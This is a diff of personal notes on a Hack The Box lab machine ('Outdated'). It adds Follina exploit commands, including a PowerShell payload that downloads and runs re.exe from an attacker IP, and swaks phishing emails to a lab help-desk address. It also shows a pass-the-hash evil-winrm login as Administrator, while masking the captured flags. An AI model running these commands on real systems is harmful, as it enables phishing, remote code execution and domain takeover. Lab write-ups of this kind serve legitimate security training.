@@ -114,7 +114,14 @@ sudo vim /etc/hosts
 outdated.htb mail.outdated.htb
 
 └──╼ [★]$ sudo python3 follina.py -i 10.10.14.28 -p 8000
+
 sudo swaks --to itsupport@outdated.htb --from rogue@rogue --server mail.outdated.htb --body "http://10.10.14.28/"
+
+https://github.com/chvancooten/follina.py
+
+sudo python3 follina.py -t docx -m command -c "powershell -c iwr -uri http://10.10.14.6/re.exe -outfile re.exe; ./re.exe" 
+
+sudo swaks --to itsupport@outdated.htb --from rogue@rogue --server mail.outdated.htb --body "http://10.10.14.113/exploit.html"
 
 https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
 
@@ -234,7 +241,7 @@ dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
 
 └──╼ [★]$ evil-winrm -i 10.129.56.140 -u Administrator -H 716f1ce2e2cf38ee1210cce35eb78cb6
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat /users/sflowers/Desktop/user.txt
-81113c27e9201255d99fa5f9b0e22ec0
+81113c27e92*********************
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
-8822592490012737f4ee44955d0be33d
+88225924900*********************
